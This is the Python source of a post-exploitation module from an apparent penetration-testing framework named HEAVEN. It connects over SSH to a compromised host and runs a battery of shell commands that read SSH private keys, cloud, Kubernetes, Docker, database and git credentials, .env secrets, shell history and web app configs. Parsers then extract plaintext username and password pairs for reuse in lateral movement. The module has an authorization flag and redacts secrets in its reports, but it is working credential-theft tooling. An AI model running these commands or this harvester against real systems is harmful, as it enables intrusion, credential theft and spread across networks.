"""HEAVEN — post-exploitation loot / credential harvester.

Once HEAVEN has a shell on a host, the single highest-impact next step is to
find *reusable* secrets: SSH keys, cloud credentials, kubeconfigs, database
passwords, and secrets sitting in ``.env`` / history files. Those credentials
are exactly what feeds the lateral-movement loop — harvest here, validate with
:class:`~heaven.postex.cred_validator.CredentialValidator`, pivot with
:mod:`heaven.postex.lateral`.

Safety:
  * Every command is **read-only** and output-bounded (``head -N``) so the
    harvester can never turn into a bulk-exfil tool.
  * Secrets are **redacted** everywhere they surface (findings, DB, reports):
    :meth:`LootResult.to_findings` and ``to_dict`` only ever emit a masked
    preview. The real plaintext lives only in-memory on
    :attr:`LootItem.credentials`, so the orchestrator can hand it straight to
    the credential validator without it ever being written to disk.
  * Authorization-gated like every other post-ex module.

The parser (:func:`parse_loot`) is SSH-free and deterministic, so it is
unit-tested against canned file contents.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional

from heaven.postex import mitre_attack as mitre
from heaven.utils.logger import get_logger

logger = get_logger("postex.loot")


def _as_text(data: Any) -> str:
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data or ""


def redact(secret: str) -> str:
    """Non-reversible preview of a secret (``AKIA…7Q``). Never > first3+last2."""
    s = (secret or "").strip()
    if not s:
        return ""
    if len(s) <= 6:
        return "•" * len(s)
    return f"{s[:3]}…{s[-2:]}"


# ── read-only loot battery ──────────────────────────────────────────────────
LOOT_BATTERY: dict[str, str] = {
    "ssh_keys": (
        "for f in $(find / -maxdepth 5 \\( -name id_rsa -o -name id_ed25519 "
        "-o -name id_ecdsa -o -name id_dsa \\) -type f 2>/dev/null | head -20); do "
        "echo \"KEY:$f\"; head -1 \"$f\" 2>/dev/null; done"
    ),
    "aws": "cat ~/.aws/credentials /root/.aws/credentials 2>/dev/null | head -40",
    "gcloud": "ls -la ~/.config/gcloud/*.json ~/.config/gcloud/*.db 2>/dev/null",
    "azure": "ls -la ~/.azure/*.json 2>/dev/null",
    "kube": "grep -hE 'server:|token:|password:|client-key-data:' ~/.kube/config /root/.kube/config 2>/dev/null | head -20",
    "docker": "cat ~/.docker/config.json /root/.docker/config.json 2>/dev/null | head -40",
    "netrc": "cat ~/.netrc /root/.netrc 2>/dev/null | head -20",
    "pgpass": "cat ~/.pgpass /root/.pgpass 2>/dev/null | head -20",
    "git_creds": "cat ~/.git-credentials /root/.git-credentials 2>/dev/null | head -20",
    "env_files": (
        "for f in $(find / -maxdepth 5 -name '.env' -type f 2>/dev/null | head -15); do "
        "echo \"ENVFILE:$f\"; grep -iE 'pass|secret|token|api[_-]?key|_key|db_' "
        "\"$f\" 2>/dev/null | head -20; done"
    ),
    "history": (
        "grep -hiE 'sshpass|mysql .*-p[A-Za-z0-9]|psql .*password|curl .*-u [A-Za-z0-9]|"
        "export [A-Z_]*(SECRET|TOKEN|PASSWORD|API)|-p[A-Za-z0-9]{4,}' "
        "~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null | head -40"
    ),
    "app_configs": (
        "for f in /var/www/html/wp-config.php /var/www/*/config.php "
        "/var/www/*/wp-config.php /opt/*/application.properties; do "
        "grep -iHE \"password|passwd|db_pass|secret\" \"$f\" 2>/dev/null | head -5; done"
    ),
}

# env keys we treat as secret-bearing
_SECRET_KEY_RE = re.compile(r"(pass|passwd|password|secret|token|api[_-]?key|_key|db_)", re.I)


@dataclass
class LootItem:
    """One harvested loot record.

    Plaintext credentials are stored **outside** the dataclass field list — see
    :attr:`credentials`. This is deliberate: it means ``dataclasses.asdict()``,
    ``dataclasses.fields()``, and the default ``__repr__`` cannot reach them,
    so reflection-based serializers cannot accidentally leak plaintext.
    Sanctioned serializers are :meth:`to_dict` (redacted).
    """

    category: str
    path: str = ""
    severity: str = "high"
    confidence: float = 0.85
    description: str = ""
    technique: str = ""
    secret_preview: str = ""

    def __post_init__(self) -> None:
        # Real (user, secret, service_hint) tuples. Held OUTSIDE the dataclass
        # field list so `dataclasses.asdict()` / `dataclasses.fields()` /
        # default `repr()` can never surface plaintext.
        self._credentials: list[tuple[str, str, str]] = []

    @property
    def credentials(self) -> list[tuple[str, str, str]]:
        """Mutable in-memory credential list. Callers may ``.append(...)``.

        This attribute is intentionally not a dataclass field; see class doc.
        """
        return self._credentials

    def wipe_secrets(self) -> None:
        """Zero the in-memory plaintext credentials. Best-effort cleanup after
        the credential-reuse loop has consumed them."""
        self._credentials = []

    def __repr__(self) -> str:
        # Redacted — never surfaces plaintext even in log lines / debuggers.
        return (
            f"LootItem(category={self.category!r}, path={self.path!r}, "
            f"severity={self.severity!r}, "
            f"secret_preview={self.secret_preview!r}, "
            f"credentials=<{len(self._credentials)} redacted>)"
        )

    def to_dict(self) -> dict[str, Any]:
        # Redacted view for DB / reports / API.
        return {
            "category": self.category, "path": self.path,
            "severity": self.severity, "confidence": self.confidence,
            "description": self.description, "technique": self.technique,
            "secret_preview": self.secret_preview,
            "credential_count": len(self._credentials),
            "credential_users": [c[0] for c in self._credentials if c[0]][:10],
        }


@dataclass
class LootResult:
    host: str
    user: str
    success: bool
    items: list[LootItem] = field(default_factory=list)
    error: str = ""

    def harvested_credentials(self, service_hint: str = "") -> list[tuple[str, str]]:
        """Reusable (username, password) pairs for the cred-reuse loop.

        Only returns pairs where both a username and a plaintext secret exist.
        Filter by ``service_hint`` (e.g. "ssh") to restrict to a protocol.
        """
        creds: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()
        for item in self.items:
            for user, secret, hint in item.credentials:
                if not user or not secret:
                    continue
                if service_hint and hint and hint != service_hint:
                    continue
                pair = (user, secret)
                if pair not in seen:
                    seen.add(pair)
                    creds.append(pair)
        return creds

    def to_findings(self) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for item in self.items:
            f: dict[str, Any] = {
                "target": self.host,
                "vuln_type": "exposed_secret",
                "title": item.description or f"Loot: {item.category}",
                "severity": item.severity,
                "confidence": item.confidence,
                "evidence": {
                    "source": "postex.loot",
                    "category": item.category,
                    "path": item.path,
                    "secret_preview": item.secret_preview,  # redacted
                    "credential_users": [c[0] for c in item.credentials if c[0]][:10],
                    "signals": [f"loot:{item.category}"],
                },
            }
            if item.technique:
                mitre.tag(f, item.technique)
            findings.append(f)
        return findings

    def wipe_secrets(self) -> None:
        """Zero every item's in-memory plaintext credential list."""
        for item in self.items:
            item.wipe_secrets()

    def __repr__(self) -> str:
        # Explicit redaction, in case an operator prints the object.
        return (
            f"LootResult(host={self.host!r}, user={self.user!r}, "
            f"success={self.success!r}, items={len(self.items)} "
            f"(credentials redacted), error={self.error!r})"
        )

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host, "user": self.user, "success": self.success,
            "error": self.error,
            "items": [i.to_dict() for i in self.items],
            "item_count": len(self.items),
            "credential_count": sum(len(i.credentials) for i in self.items),
        }


# ── Pure parser ─────────────────────────────────────────────────────────────
def parse_loot(host: str, user: str, outputs: dict[str, str]) -> LootResult:
    items: list[LootItem] = []
    items.extend(_parse_ssh_keys(outputs.get("ssh_keys", "")))
    items.extend(_parse_aws(outputs.get("aws", "")))
    items.extend(_parse_ls_present(outputs.get("gcloud", ""), "gcloud",
                                   "Google Cloud credentials present", mitre.T_PASSWORD_STORES))
    items.extend(_parse_ls_present(outputs.get("azure", ""), "azure",
                                   "Azure access tokens present", mitre.T_PASSWORD_STORES))
    items.extend(_parse_kube(outputs.get("kube", "")))
    items.extend(_parse_docker(outputs.get("docker", "")))
    items.extend(_parse_netrc(outputs.get("netrc", "")))
    items.extend(_parse_pgpass(outputs.get("pgpass", "")))
    items.extend(_parse_git_creds(outputs.get("git_creds", "")))
    items.extend(_parse_env_files(outputs.get("env_files", "")))
    items.extend(_parse_history(outputs.get("history", "")))
    items.extend(_parse_app_configs(outputs.get("app_configs", "")))
    return LootResult(host=host, user=user, success=True, items=items)


def _parse_ssh_keys(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    path = ""
    for line in text.splitlines():
        if line.startswith("KEY:"):
            path = line[4:].strip()
        elif path and line.strip():
            encrypted = "ENCRYPTED" in line or "Proc-Type" in line
            items.append(LootItem(
                category="ssh_private_key", path=path, severity="high",
                confidence=0.9,
                description=f"SSH private key readable: {path}"
                            + (" (passphrase-protected)" if encrypted else ""),
                technique=mitre.T_PRIVATE_KEYS,
                secret_preview="<private key present>",  # nosec B106
            ))
            path = ""
    return items


def _parse_aws(text: str) -> list[LootItem]:
    akid = re.search(r"aws_access_key_id\s*=\s*(\S+)", text, re.I)
    secret = re.search(r"aws_secret_access_key\s*=\s*(\S+)", text, re.I)
    if not akid:
        return []
    key = akid.group(1)
    sec = secret.group(1) if secret else ""
    item = LootItem(
        category="aws_credentials", path="~/.aws/credentials", severity="critical",
        confidence=0.9, description="AWS access key + secret harvested",
        technique=mitre.T_CREDS_IN_FILES,
        secret_preview=f"{redact(key)} / {redact(sec)}",
    )
    if sec:
        item.credentials.append((key, sec, "aws"))
    return [item]


def _parse_ls_present(text: str, category: str, desc: str, technique: str) -> list[LootItem]:
    if not text.strip():
        return []
    first = next((ln for ln in text.splitlines() if ln.strip()), "")
    path = first.split()[-1] if first.split() else ""
    return [LootItem(category=category, path=path, severity="high", confidence=0.8,
                     description=desc, technique=technique,
                     secret_preview="<credential file present>")]  # nosec B106


def _parse_kube(text: str) -> list[LootItem]:
    if not text.strip():
        return []
    server = re.search(r"server:\s*(\S+)", text)
    token = re.search(r"token:\s*(\S+)", text)
    preview = f"server={server.group(1)}" if server else "kubeconfig present"
    if token:
        preview += f" token={redact(token.group(1))}"
    return [LootItem(category="kubeconfig", path="~/.kube/config", severity="critical",
                     confidence=0.85, description="Kubernetes kubeconfig with credentials",
                     technique=mitre.T_KUBECONFIG, secret_preview=preview)]


def _parse_docker(text: str) -> list[LootItem]:
    if '"auths"' not in text and "auth" not in text:
        return []
    return [LootItem(category="docker_config", path="~/.docker/config.json",
                     severity="high", confidence=0.8,
                     description="Docker registry auth tokens present",
                     technique=mitre.T_CREDS_IN_FILES,
                     secret_preview="<registry auth present>")]  # nosec B106


def _parse_netrc(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    for m in re.finditer(r"machine\s+(\S+).*?login\s+(\S+).*?password\s+(\S+)",
                         text, re.I | re.S):
        machine, login, pwd = m.group(1), m.group(2), m.group(3)
        item = LootItem(
            category="netrc", path="~/.netrc", severity="high", confidence=0.9,
            description=f"Credentials in .netrc for {machine}",
            technique=mitre.T_CREDS_IN_FILES,
            secret_preview=f"{login}:{redact(pwd)}@{machine}",
        )
        item.credentials.append((login, pwd, ""))
        items.append(item)
    return items


def _parse_pgpass(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.count(":") < 4:
            continue
        parts = line.split(":")
        host, _port, _db, user, pwd = parts[0], parts[1], parts[2], parts[3], ":".join(parts[4:])
        item = LootItem(
            category="pgpass", path="~/.pgpass", severity="high", confidence=0.9,
            description=f"PostgreSQL credentials for {user}@{host}",
            technique=mitre.T_CREDS_IN_FILES,
            secret_preview=f"{user}:{redact(pwd)}@{host}",
        )
        item.credentials.append((user, pwd, "postgres"))
        items.append(item)
    return items


def _parse_git_creds(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    for m in re.finditer(r"https?://([^:/@]+):([^@]+)@(\S+)", text):
        user, pwd, host = m.group(1), m.group(2), m.group(3)
        item = LootItem(
            category="git_credentials", path="~/.git-credentials", severity="high",
            confidence=0.9, description=f"Git credentials for {host}",
            technique=mitre.T_CREDS_IN_FILES,
            secret_preview=f"{user}:{redact(pwd)}@{host}",
        )
        item.credentials.append((user, pwd, "http"))
        items.append(item)
    return items


def _parse_env_files(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    path = ""
    for line in text.splitlines():
        if line.startswith("ENVFILE:"):
            path = line[8:].strip()
            continue
        m = re.match(r"\s*(?:export\s+)?([A-Za-z0-9_]+)\s*=\s*(.+)", line)
        if not m or not _SECRET_KEY_RE.search(m.group(1)):
            continue
        key, val = m.group(1), m.group(2).strip().strip('"').strip("'")
        if not val or val.lower() in ("changeme", "your_password_here", ""):
            continue
        item = LootItem(
            category="env_secret", path=path, severity="high", confidence=0.8,
            description=f"Secret in env file: {key} ({path or '.env'})",
            technique=mitre.T_CREDS_IN_FILES,
            secret_preview=f"{key}={redact(val)}",
        )
        # DB_USER/DB_PASSWORD pairs are directly reusable
        if re.search(r"pass", key, re.I):
            item.credentials.append(("", val, ""))
        items.append(item)
    return items


def _parse_history(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        cred: Optional[tuple[str, str, str]] = None
        # mysql -u root -pS3cret
        mm = re.search(r"-u\s*(\S+)\s+-p(\S+)", line)
        if mm:
            cred = (mm.group(1), mm.group(2), "mysql")
        # sshpass -p 'pass' user@host
        sm = re.search(r"sshpass\s+-p\s*'?([^'\s]+)'?\s+(?:\S+\s+)?(\S+)@", line)
        if sm:
            cred = (sm.group(2), sm.group(1), "ssh")
        # curl -u user:pass
        cm = re.search(r"-u\s+([^:\s]+):(\S+)", line)
        if cm and not mm:
            cred = (cm.group(1), cm.group(2), "http")
        preview = re.sub(r"(-p\s*)(\S+)", lambda g: g.group(1) + redact(g.group(2)), line)[:120]
        item = LootItem(
            category="history_secret", path="shell history", severity="medium",
            confidence=0.7, description="Credential leaked in shell history",
            technique=mitre.T_BASH_HISTORY, secret_preview=preview,
        )
        if cred:
            item.credentials.append(cred)
        items.append(item)
    return items[:20]


def _parse_app_configs(text: str) -> list[LootItem]:
    items: list[LootItem] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        path, _, body = line.partition(":")
        m = re.search(r"['\"]?([^'\"]*pass[^'\"]*)['\"]?\s*[,=:>]+\s*['\"]?([^'\";]+)", body, re.I)
        preview = redact(m.group(2)) if m else "<secret present>"
        items.append(LootItem(
            category="app_config_secret", path=path, severity="high", confidence=0.75,
            description=f"Database/app secret in {path}",
            technique=mitre.T_CREDS_IN_FILES,
            secret_preview=f"…{preview}",
        ))
    return items[:20]


# ── SSH runner ──────────────────────────────────────────────────────────────
class LootHarvester:
    """Harvest reusable secrets from a compromised host. Authorization-gated."""

    def __init__(self, authorized: bool = False):
        self.authorized = authorized

    async def harvest(
        self, host: str, username: str, password: Optional[str] = None,
        private_key: Optional[str] = None, port: int = 22,
        per_command_timeout: float = 25.0,
    ) -> LootResult:
        if not self.authorized:
            return LootResult(host=host, user=username, success=False,
                              error="aborted: harvester not authorized")
        try:
            import asyncssh  # type: ignore[import-not-found]
        except ImportError:
            return LootResult(host=host, user=username, success=False,
                              error="asyncssh not installed — pip install asyncssh")

        client_keys = [private_key] if private_key else None
        outputs: dict[str, str] = {}
        try:
            async with asyncssh.connect(  # type: ignore[attr-defined]
                host, port=port, username=username, password=password,
                client_keys=client_keys, known_hosts=None,
            ) as conn:
                for key, cmd in LOOT_BATTERY.items():
                    try:
                        r = await conn.run(cmd, check=False, timeout=per_command_timeout)
                        outputs[key] = _as_text(r.stdout)
                    except Exception as e:
                        outputs[key] = ""
                        logger.debug("loot cmd %s failed: %s", key, e)
        except Exception as e:
            return LootResult(host=host, user=username, success=False,
                              error=f"{type(e).__name__}: {e}")

        result = parse_loot(host, username, outputs)
        logger.info("loot %s@%s: %d item(s), %d credential(s)",
                    username, host, len(result.items),
                    sum(len(i.credentials) for i in result.items))
        return result


__all__ = ["LootHarvester", "LootResult", "LootItem", "parse_loot", "redact", "LOOT_BATTERY"]
